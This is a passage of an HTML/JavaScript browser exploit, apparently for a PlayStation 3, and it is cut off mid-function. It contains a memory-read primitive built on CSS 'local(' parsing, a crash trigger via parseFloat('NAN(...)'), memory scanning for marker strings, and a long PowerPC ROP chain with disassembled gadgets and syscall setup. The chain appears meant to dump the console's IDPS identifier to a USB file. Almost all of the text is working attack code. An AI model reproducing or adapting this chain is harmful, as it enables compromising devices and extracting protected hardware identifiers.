<html>
<script src="include/jquery.js"></script>
<script src="include/utils.js"></script>
<script src="include/IEEE754.js"></script>
<head>
<script>

//var blr = unescape("\u4E80\u0020");
//var mtspr = unescape("\u7C08\u03A6");
//var nop = unescape("\u6000\u0000");

function Repeat(s, n)
{
	var a = [];
	
	while(a.length < n)
	{
		a.push(s);
	}
	return a.join('');
}

function readMemory(address, size)
{
	var exploit = document.getElementById('exploit');
	exploit.style.src = 'local(' + generateExploit(address, size) + ')';
	return exploit.style.src;
}

function hexh2bin(hex_val)
{
	var str = "";
	var half = hex_val & 0xFFFF;
	
	// get hex
	str = half.toString(16);
	
	// pad as needed
	if (str.length < 3)
	{
		str = "%" + Repeat("0", 2 - str.length) + str;
	}
	else
	{
		str = "%u" + Repeat("0", 4 - str.length) + str;;
	}
	
	return unescape(str);
}

function bin2unescape(str, n) {
   var a = [], start=0;
   while(start<str.length) {
   if (a === "\0") {
    str.replace("\0", "\\0");
   }
      a.push(str.slice(start, start+n));
      start+=n;
   }
   return (a.join("" + "\\u"));
}

String.prototype.replaceAt=function(index, char) 
{
	return this.substr(0, index) + char + this.substr(index+char.length);
}

function findExploit(name,exploit_data,search_base,search_size,pattern,len)
{
	try
	{
		//var search_base = 0x80150000;
		//var search_size = 0x450000;
		
		var dat = readMemory(search_base, search_size);
		
		// move past "local("
		dat = dat.substr(6, search_size);
		
		// loop for tag
		for (var i = 0; i < (search_size*2); i += 0x10)
		//for (var i = 0; i < (20000*0x10); i += 0x8)
		{
			//if (i > 20000*0x10) {return 0;}
			if (dat.charCodeAt(i/2) == pattern)
			{
				var match = 0;
				
				// loop next 5 bits
				for (var k = 0; k < len; k+=2)
				{
					// convert to string
					if (dat.charCodeAt((i+k)/2) != exploit_data.charCodeAt(k/2))
					{
						break;
					}
					// increment match
					match += 2;
				}
				
				// we got a complete match
				if (match == len)
				{
					// hold exploit addr
					var exploit_addr = search_base + i + 2;
					
					// display the exploit address
					dbg("Found " + name + " at: " + exploit_addr.toString(16));
					//dbg("Loop: "+(i/0x10));
					dat=null;
					return exploit_addr;
				}
			}
		}
		dat=null;
		dbg("The string variable named " + name + " could not be located in the search range.");
		return 0;
	} 
	catch(e) 
	{
		dbg(e);
	}
}

function trigger(exploit_addr)
{
	// dump data
	var span = document.createElement("div");
	document.getElementById("BodyID").appendChild(span);
	span.innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");
}

function initROP(){
	
	try
	{
		var gadget,payload,idps_storage_usb,idps_hex,idps_base,usb_generic_storage,jump_2,jump_1,g,j1,j2;
		var payload_addr=0;		
		var gadget_addr=0;
		var jump_1_addr=0;
		var jump_2_addr=0;
		var idps_storage_usb_addr=0;
		var idps_hex_addr=0;
		var idps_base_addr=0;
		var usb_generic_storage_addr = 0;

		// Find Payload Pointer Address
		dbg("Processing payload string.. Searching for valid offset....");
		
		do{
		payload =  unescape("\u2F2A\u3860\u1004\u3880\u000A\u38A0\u01B6\u3960\u0188\u4400\u0002\u4E80\u0020\u2F2A"); // 16 total bytes after placeholder
		payload_addr = findExploit("payload",payload,0x80150000,0x450000,0x2F2A,0x18);
		}
		while(payload_addr==0);
		
		// Find IDPS USB Storage Address
		/*
		/dev_usb000/idps.bin
		\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E
		*/
		dbg("Processing idps_storage_usb strings.. Searching for valid offset....");
		do{
		idps_storage_usb =  unescape("\u2220\u2F64\u6576\u5F75\u7362\u3030\u302F\u7564\u7073\u2E62\u696E\u2220");
		idps_storage_usb_addr = findExploit("idps_storage_usb",idps_storage_usb,0x80150000,0x450000,0x2220,0x14);
		}
		while(idps_storage_usb_addr==0);
		
		// Find IDPS Hex Bytes Address
		dbg("Processing idps_hex strings.. Searching for valid offset....");
		do{
		idps_hex =  unescape("\u2F4A\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u2F4A");
		idps_hex_addr = findExploit("idps_hex",idps_hex,0x80150000,0x450000,0x2F4A,0x10);
		}
		while(idps_hex_addr==0);
		
		// Find IDPS Base Address Pointer [0x00735F98]
		dbg("Processing idps_base strings.. Searching for valid offset....");
		do{
		idps_base =  unescape("\u2F5A\u0000\u0000\u0073\u5F98\u2F5A");
		idps_base_addr = findExploit("idps_base",idps_base,0x80150000,0x450000,0x2F5A,0x8);
		}
		while(idps_base_addr==0);
		
		// Find USB Generic Storage Address Pointer
		// \u2F64\u6576\u5F75\u7362 <-- /dev_usb
		dbg("Processing usb_generic_storage strings.. Searching for valid offset....");
		do{
		usb_generic_storage =  unescape("\uDEDD\u2F64\u6576\u5F75\u7362\uDEDD");
		usb_generic_storage_addr = findExploit("usb_generic_storage",usb_generic_storage,0x80150000,0x450000,0xDEDD,0x8);
		}
		while(usb_generic_storage_addr==0);
		
		
		//gadget =  unescape("\u7E2F\u006F\uC0F0\u7E2F"); //for DEX - libc memcpy
		//gadget =  unescape("\u7E2F\u000C\u6730\u7E2F"); //for DEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u000C\u5234\u7E2F"); //for CEX - 3 beeps + shutdown
		//gadget =  unescape("\u7E2F\u0044\uE8CC\u7E2F"); //for DEX - 3 beeps + freeze
		//gadget =  unescape("\u7E2F\u0044\u6CD8\u7E2F"); //for CEX - 3 beeps + freeze
		
		
		// **************************************************************************************
		// DEX
		// execute gadget #1
		// gadget entry
		/*
		000976BC 7D615B78 mr         r1,r11
		000976C0 4E800020 blr 
		*/
		gadget =  unescape("\u4444\u0009\u76BC");// 6 bytes [total: 6 bytes]
		
		// padding 36 bytes [total: 42 bytes]
		gadget =  gadget+unescape("\uDECA\uF01E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		// **************************************************************************************
		
		
		// **************************************************************************************
		// preparing gadget #2
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0020");// r2 8 bytes [total: 50 bytes]
		
		// padding 112 bytes [total: 162 bytes]
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uDECA\uF02B");
		
		// execute gadget #2
		/*
		01C6324C E8010130 ld         r0,0x130(r1)                   PIPE
		01C63250 81810128 lwz        r12,0x128(r1)
		01C63254 80610070 lwz        r3,0x70(r1)                    PIPE
		01C63258 7C0803A6 mtspr      lr,r0
		01C6325C E9C10090 ld         r14,0x90(r1)
		01C63260 7D908120 mtocrf     0x08,r12
		01C63264 E9E10098 ld         r15,0x98(r1)
		01C63268 EA0100A0 ld         r16,0xA0(r1)
		01C6326C EA2100A8 ld         r17,0xA8(r1)                   PIPE
		01C63270 EA4100B0 ld         r18,0xB0(r1)
		01C63274 EA6100B8 ld         r19,0xB8(r1)                   PIPE
		01C63278 EA8100C0 ld         r20,0xC0(r1)
		01C6327C EAA100C8 ld         r21,0xC8(r1)                   PIPE
		01C63280 EAC100D0 ld         r22,0xD0(r1)
		01C63284 EAE100D8 ld         r23,0xD8(r1)                   PIPE
		01C63288 EB0100E0 ld         r24,0xE0(r1)
		01C6328C EB2100E8 ld         r25,0xE8(r1)                   PIPE
		01C63290 EB4100F0 ld         r26,0xF0(r1)
		01C63294 EB6100F8 ld         r27,0xF8(r1)                   PIPE
		01C63298 EB810100 ld         r28,0x100(r1)
		01C6329C EBA10108 ld         r29,0x108(r1)                  PIPE
		01C632A0 EBC10110 ld         r30,0x110(r1)
		01C632A4 EBE10118 ld         r31,0x118(r1)                  PIPE
		01C632A8 38210120 addi       r1,r1,0x120
		01C632AC 4E800020 blr
		*/
		gadget =  gadget+unescape("\u0000\u0000\u01C6\u324C");// return address from r1 into r0 8 bytes [total: 170 bytes]
		
		// padding 120 bytes [total: 282 bytes]
		gadget =  gadget+unescape("\uDECA\uF02E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		// **************************************************************************************
		
		
		// **************************************************************************************
		// preparing gadget #3
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0140");// r14 160 bytes start
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0150");// r15
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0160");// r16
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0170");// r17
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0180");// r18
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0190");// r19
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0200");// r20
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0210");// r21
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0220");// r22
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0230");// r23
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0240");// r24
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0250");// r25
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0260");// r26
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0270");// r27
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");// r28
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");// r29
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31
		
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141");// padding
		gadget =  gadget+unescape("\u8020\u0120");// r12
		gadget =  gadget+unescape("\uDECA\uF03B");// padding 160 bytes end [total: 442 bytes]
		
		// execute gadget #3
		/*
		006161CC 80A10088 lwz        r5,0x88(r1)                    PIPE
		006161D0 8081008C lwz        r4,0x8C(r1)
		006161D4 80610090 lwz        r3,0x90(r1)                    PIPE
		006161D8 81210094 lwz        r9,0x94(r1)
		006161DC 80010070 lwz        r0,0x70(r1)                    PIPE
		006161E0 913F0024 stw        r9,0x24(r31)
		006161E4 901F0000 stw        r0,0x0(r31)                    PIPE
		006161E8 917F0004 stw        r11,0x4(r31)
		006161EC 915F0008 stw        r10,0x8(r31)                   PIPE
		006161F0 911F000C stw        r8,0xC(r31)
		006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE
		006161F8 90DF0014 stw        r6,0x14(r31)
		006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE
		00616200 909F001C stw        r4,0x1C(r31)
		00616204 907F0020 stw        r3,0x20(r31)                   PIPE
		00616208 E80100D0 ld         r0,0xD0(r1)
		0061620C 7FA307B4 extsw      r3,r29
		00616210 EBC100B0 ld         r30,0xB0(r1)
		00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE
		00616218 7C0803A6 mtspr      lr,r0
		0061621C EBE100B8 ld         r31,0xB8(r1)
		00616220 382100C0 addi       r1,r1,0xC0
		00616224 4E800020 blr
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0061\u61CC");// return address from r1 into r0 8 bytes [total: 450 bytes]
		
		// padding 112 bytes [total: 562 bytes]
		gadget =  gadget+unescape("\uDECA\uF03E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		// **************************************************************************************
		
		
		// **************************************************************************************
		// preparing gadget #4
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0050");// r5 72 bytes start <-- position 287-288 [if using, change payload position to 285-286]
		
		gadget =  gadget+unescape("\u0001\u0C70");
		gadget =  gadget+unescape("\u0051\uA390");
		
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u8020\u0290\u0000\u0000\u8000\u0160\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\uDECA\uF04B");// padding 72 bytes end [total: 634 bytes]
		
		
		// execute gadget #4
		/*
		0051A390 E9610080 ld         r11,0x80(r1)
		0051A394 E9210088 ld         r9,0x88(r1)                    PIPE
		0051A398 F81E0000 std        r0,0x0(r30)
		0051A39C F93E0010 std        r9,0x10(r30)                   PIPE
		0051A3A0 F97E0008 std        r11,0x8(r30)
		0051A3A4 E80100C0 ld         r0,0xC0(r1)                    PIPE
		0051A3A8 7C6307B4 extsw      r3,r3
		0051A3AC EB810090 ld         r28,0x90(r1)
		0051A3B0 EBA10098 ld         r29,0x98(r1)
		0051A3B4 7C0803A6 mtspr      lr,r0
		0051A3B8 EBC100A0 ld         r30,0xA0(r1)
		0051A3BC EBE100A8 ld         r31,0xA8(r1)                   PIPE
		0051A3C0 382100B0 addi       r1,r1,0xB0
		0051A3C4 4E800020 blr 
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0051\uA390");// return address from r1 into r0 8 bytes [total: 642 bytes]
		// **************************************************************************************
		
		
		// **************************************************************************************
		// preparing gadget #5
		
		// padding 104 bytes [total: 746 bytes]
		gadget =  gadget+unescape("\uDECA\uF04E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0110");// r11 64 bytes start <-- position 379-380
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0090");// r9 <-- position 383-384
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0280");// r28 <-- position 387-388
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");// r29 <-- position 391-392
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30 <-- position 395-396
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31 <-- position 399-400
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\uDECA\uF05B");// padding 64 bytes end [total: 810 bytes]
		
		
		// execute gadget #5
		
		/*
		006161B8 81610074 lwz        r11,0x74(r1)
		006161BC 81410078 lwz        r10,0x78(r1)                   PIPE
		006161C0 8101007C lwz        r8,0x7C(r1)
		006161C4 80E10080 lwz        r7,0x80(r1)                    PIPE
		006161C8 80C10084 lwz        r6,0x84(r1)
		006161CC 80A10088 lwz        r5,0x88(r1)                    PIPE
		006161D0 8081008C lwz        r4,0x8C(r1)
		006161D4 80610090 lwz        r3,0x90(r1)                    PIPE
		006161D8 81210094 lwz        r9,0x94(r1)
		006161DC 80010070 lwz        r0,0x70(r1)                    PIPE
		006161E0 913F0024 stw        r9,0x24(r31)
		006161E4 901F0000 stw        r0,0x0(r31)                    PIPE
		006161E8 917F0004 stw        r11,0x4(r31)
		006161EC 915F0008 stw        r10,0x8(r31)                   PIPE
		006161F0 911F000C stw        r8,0xC(r31)
		006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE
		006161F8 90DF0014 stw        r6,0x14(r31)
		006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE
		00616200 909F001C stw        r4,0x1C(r31)
		00616204 907F0020 stw        r3,0x20(r31)                   PIPE
		00616208 E80100D0 ld         r0,0xD0(r1)
		0061620C 7FA307B4 extsw      r3,r29
		00616210 EBC100B0 ld         r30,0xB0(r1)
		00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE
		00616218 7C0803A6 mtspr      lr,r0
		0061621C EBE100B8 ld         r31,0xB8(r1)
		00616220 382100C0 addi       r1,r1,0xC0
		00616224 4E800020 blr                                      08
		00616228 8062B140 lwz        r3,-0x4EC0(r2)
		0061622C 48007E95 bl         0x0061E0C0                    08
		00616230 60000000 nop
		00616234 E80100D0 ld         r0,0xD0(r1)
		00616238 EBC100B0 ld         r30,0xB0(r1)
		0061623C 7FA307B4 extsw      r3,r29
		00616240 EBE100B8 ld         r31,0xB8(r1)
		00616244 EBA100A8 ld         r29,0xA8(r1)                   PIPE
		00616248 7C0803A6 mtspr      lr,r0
		0061624C 382100C0 addi       r1,r1,0xC0
		00616250 4E800020 blr
		*/
		
		gadget =  gadget+unescape("\u0000\u0000\u0061\u61B8");// return address from r1 into r0 8 bytes [total: 818 bytes]
		
		// padding 88 bytes [total: 906 bytes]
		gadget =  gadget+unescape("\uDECA\uF05E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		// **************************************************************************************
		
		
		// **************************************************************************************
		// preparing gadget #6
		gadget =  gadget+unescape("\u8020\u0000");// r0 temp 96 bytes start <-- sets r3 in gadget #7 <-- position 457-458
		gadget =  gadget+unescape("\u0000\u0321");// r11 <-- syscall number sys_fs_open <-- position 459-460
		gadget =  gadget+unescape("\u8020\u0100");// r10 <-- position 461-462
		gadget =  gadget+unescape("\u8020\u0080");// r8 <-- position 463-464
		gadget =  gadget+unescape("\u8020\u8070");// r7 <-- position 465-466
		gadget =  gadget+unescape("\u0000\u0000");// r6 <-- position 467-468
		gadget =  gadget+unescape("\u0000\u0000");// r5 <-- position 469-470
		gadget =  gadget+unescape("\u0000\u0001");// r4 <-- position 471-472
		gadget =  gadget+unescape("\u8020\u0030");// r3 <-- position 473-474 
		gadget =  gadget+unescape("\u8020\u0090");// r9 <-- position 475-476
		
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141");// padding
		gadget =  gadget+unescape("\u4242\u4242\u4242\u4242");// padding
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0290");// r29 <-- position 487-488
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0300");// r30 <-- position 491-492
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31 <-- position 495-496
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\uDECA\uF06B"); // 96 bytes end [total: 1002 bytes]
		
		
		// execute gadget #6
		// all registers set except r3 has FFFFFFFF in 1st 8 bytes
		/*
		00013B74 E8010090 ld         r0,0x90(r1)
		00013B78 7FE3FB78 mr         r3,r31
		00013B7C 7C0803A6 mtspr      lr,r0                         01 (00013B74) REG
		00013B80 EBE10078 ld         r31,0x78(r1)
		00013B84 38210080 addi       r1,r1,0x80
		00013B88 4E800020 blr
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0001\u3B74");// return address from r1 into r0 8 bytes [total: 1010 bytes]
		
		// padding 96 bytes [total: 1106 bytes]
		gadget =  gadget+unescape("\uDECA\uF06E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		// **************************************************************************************
		
		
		// **************************************************************************************
		// preparing gadget #7
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31 24 bytes start <-- position 559-560
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0030");// r3 <-- position 563-564
		gadget =  gadget+unescape("\u4141\u4141\uDECA\uF07B");// padding 24 bytes end [total: 1130 bytes]
		
		
		//**** TO KEEP REPLACE POSITIONS FROM SHIFTING, START SYSCALL CHAIN FROM HERE ****
		
		
		// execute gadget #7
		/* 
		0003F6AC 44000002 sc                                       23 CSI PIPE
		0003F6B0 E8010090 ld         r0,0x90(r1)
		0003F6B4 EBE10078 ld         r31,0x78(r1)                   PIPE
		0003F6B8 38210080 addi       r1,r1,0x80
		0003F6BC 7C0803A6 mtspr      lr,r0
		0003F6C0 4E800020 blr 
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0003\uF6AC");// return address from r1 into r0 8 bytes [total: 1138 bytes]
		
		// padding 420 bytes start
		gadget =  gadget+unescape("\uDECA\uF07E\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		gadget =  gadget+unescape("\u0000\u0000\u8020\u0310");// r31
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\uDECA\uF08B");
		// **************************************************************************************
		
		
		// **************************************************************************************
		// preparing gadget #8
		
		
		
		
		// execute gadget #8
		/*
		0011746C 813D0010 lwz        r9,0x10(r29)
		00117470 80DE0028 lwz        r6,0x28(r30)
		00117474 80810074 lwz        r4,0x74(r1)                    PIPE
		00117478 80BE0024 lwz        r5,0x24(r30)
		0011747C 81010078 lwz        r8,0x78(r1)                    PIPE
		00117480 80090000 lwz        r0,0x0(r9)
		00117484 F8410028 std        r2,0x28(r1)                    PIPE
		00117488 7C0903A6 mtspr      ctr,r0
		0011748C 80610070 lwz        r3,0x70(r1)
		00117490 80490004 lwz        r2,0x4(r9)
		00117494 4E800421 bctrl
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0011\u746C");// return address from r1 into r0
		
		
		gadget =  gadget+unescape("\uDECA\uF08E\u7555\u7666\u7777\u7888\u7999\u7AAA\u7BBB\u7CCC\u7DDD\u7EEE\u6111\u6222\u6333\u6444\u6555\u6666\u6777\u6888\u6999\u6AAA\u6BBB\u6CCC\u6DDD\u6EEE\u5111\u5222\u5333\u5444\u5555\u5666\u5777\u5888\u5999\u5AAA\u5BBB\u5CCC\u5DDD\u5EEE\u4111\u4222\u4333\u4444\u4555\u4666\u4777\u4888\u4999\u4AAA\u4BBB\u4CCC\u4DDD\u4EEE\u3111\u3222\u3333\u3444\u3555\u3666\u3777\u3888\u3999\u3AAA\u3BBB\u3CCC\u3DDD\u3EEE\u2111\u2222\u2333\u2444\u2555\u2666\u2777\u2888\u2999\u2AAA\u2BBB\u2CCC\u2DDD\u2EEE\u1111\u1222\u1333\u1444\u1555\u1666\u1777\u1888\u1999\u1AAA\u1BBB\u1CCC\u1DDD\u1EEE");// padding 420 bytes end  [total: 1558 bytes]
		
		
		// **************************************************************************************
		
		
		// **************************************************************************************
		// extra findExploit addresses write here <-- NOT USED ANYMORE, JUST PADDING FOR NOW
		// this offset needs adjusted with any added padding (currently writing from gadget+0x1BE)
		gadget =  gadget+unescape("\u4141\u4141\u4249\u4249\u4349\u4349\u4449\u4449\u4549\u4549\u4649\u4649\u4749\u4749\u4141\u4141"); // 32 bytes [total: 1590 bytes]
		// **************************************************************************************
		
		
		// **************************************************************************************
		// padding + find marker NEW
		gadget =  gadget+unescape("\u4141\u4141\u696A\u696B\u4141\u4141\u7E2A"); // 14 bytes [total: 1604 bytes / 0x644]
		// **************************************************************************************
		
		
		// CEX
		//gadget =  unescape("\u4444\u0009\u7604\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0202\u0202\u0202\u0202\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u3030\u3030\u3030\u3030\u3131\u3131\u01F1\u3131\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000"); // 164 total bytes after placeholder & 24 bytes after 0xA0 r1 jump
		//gadget =  gadget+unescape("\u01c5\u324C\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1414\u1414\u1414\u1414\u1515\u1515\u1515\u1515\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u1818\u1818\u1818\u1818\u1919\u1919\u1919\u1919\u2020\u2020\u2020\u2020\u2121\u2121\u2121\u2121\u2222\u2222\u2222\u2222\u2323\u2323");//200 bytes
		//gadget =  gadget+unescape("\u2323\u2323\u2424\u2424\u2424\u2424\u2525\u2525\u2525\u2525\u2626\u2626\u2626\u2626\u2727\u2727\u2727\u2727\u2828\u2828\u2828\u2828\u0000\u0000\u0001\u0000\u3030\u3030\u3030\u3030\u0000\u0000\u8060\u0000\u01F2\u4141\u4141\u4141\u1212\u1212\u4141\u4141\u0000\u0000\u0056\u8C94\u4141\u4141\u4141\u4141");//100 bytes & 32 bytes after r1 2nd jump
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0001\u4660\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u1000\u0404\u0404\u0001\u0000\u0909\u0909\u4141"); //122 bytes
		//gadget =  gadget+unescape("\u01F3\u4141\u4141\u4141\u4141\u4141\u4141\u2929\u2929\u2929\u2929\u3030\u3030\u3030\u3030\u4141\u4141\u4141\u4141\u01F4\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u4660\u4141\4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");//92 bytes
		//gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0001\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u7E2A");//200 bytes
		
		
		// write found payload address
		//gadget = gadget.replaceAt(285, hexh2bin((payload_addr) >> 16));
		//gadget = gadget.replaceAt(286, hexh2bin(payload_addr));
		gadget = gadget.replaceAt(287, hexh2bin((payload_addr) >> 16));
		gadget = gadget.replaceAt(288, hexh2bin(payload_addr));
		
		
		// Write found addresses to gadgets hex
		// BABECAFE 3133065982
		// DEADBEEF 3735928559
		// A55FACE5 2774510821
		
		//                                 [dummy	gadget	register]
		// FEED0428 <--placeholder example [FEED	04		28		]
		
		//-------------------------------------------------------------------
		// write to gadget #3
		
		// write found address to r5
		//gadget = gadget.replaceAt(287, hexh2bin((4276945669) >> 16));
		//gadget = gadget.replaceAt(288, hexh2bin(4276945669));
		//-------------------------------------------------------------------
		
		//-------------------------------------------------------------------
		// write to gadget #4
		
		// write found address to r11
		//gadget = gadget.replaceAt(379, hexh2bin((4276945937) >> 16));
		//gadget = gadget.replaceAt(380, hexh2bin(4276945937));
		
		// write found address to r9
		//gadget = gadget.replaceAt(383, hexh2bin((4276945929) >> 16));
		//gadget = gadget.replaceAt(384, hexh2bin(4276945929));
		
		// write found address to r28
		//gadget = gadget.replaceAt(387, hexh2bin((4276945960) >> 16));
		//gadget = gadget.replaceAt(388, hexh2bin(4276945960));
		
		// write found address to r29
		//gadget = gadget.replaceAt(391, hexh2bin((4276945961) >> 16));
		//gadget = gadget.replaceAt(392, hexh2bin(4276945961));
		
		// write found address to r30
		gadget = gadget.replaceAt(395, hexh2bin((idps_storage_usb_addr) >> 16));
		gadget = gadget.replaceAt(396, hexh2bin(idps_storage_usb_addr));
		
		// write found address to r31
		gadget = gadget.replaceAt(399, hexh2bin((idps_storage_usb_addr) >> 16));
		gadget = gadget.replaceAt(400, hexh2bin(idps_storage_usb_addr));
		//-------------------------------------------------------------------
		
		//-------------------------------------------------------------------
		// write to gadget #5
		// write found address to r0
		gadget = gadget.replaceAt(457, hexh2bin((usb_generic_storage_addr) >> 16));
